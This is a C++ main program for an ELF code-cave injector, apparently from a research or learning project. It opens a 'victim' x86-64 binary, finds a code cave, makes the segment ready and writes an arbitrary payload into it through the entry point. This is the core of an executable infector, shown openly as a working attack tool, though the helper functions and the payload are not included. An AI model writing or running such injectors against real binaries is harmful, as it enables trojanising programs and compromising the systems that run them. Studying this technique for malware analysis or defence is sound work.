#include <iostream>
#include "utils/utils.h"
#include "utils/injector.h"
#include "utils/parser.h"

int main(int argc, char **argv) {
    std::ifstream input(argc > 2 ? argv[2] : "../../test/payload", std::ios::binary);

    std::vector<unsigned char> payload(std::istreambuf_iterator<char>(input), {});

    int fd = open(argc > 1 ? argv[1] : "../../test/victim", O_RDWR);

    bool isSuitable = verifyFile(fd);
    if (!isSuitable){
        std::cout << "Input file should be ELF binary (with x86-64 target isa)" << std::endl;
        return 0;
    }

    std::cout << "-- INJECTING -- " << std::endl << (argc == 3 ? argv[1] : "../../test/victim") << std::endl;

    Elf64_Ehdr ehdr;
    read(fd, &ehdr, sizeof(ehdr));
    auto entryPoint = ehdr.e_entry;

    // get code cave
    code_cave_t cc = findCodeCaveSeg(fd, payload.size() + 16);

    prepareSegment(fd, cc, ehdr);

    // get image base
    int imgBase = getImageBase(fd, ehdr);
    cc.start += imgBase;
    cc.end += imgBase;

    // inject code
    if (cc.size > payload.size())
        injectCode(fd, cc, entryPoint, ehdr, imgBase, payload);

    std::cout << "-- INJECTION COMPLETED -- "
              << (payload.size() < cc.size ? "success" : (argc > 1 ? argv[1] : "../../test/victim") +
                                                         std::string(" not enough space")) << std::endl;

    close(fd);

    return 0;
}
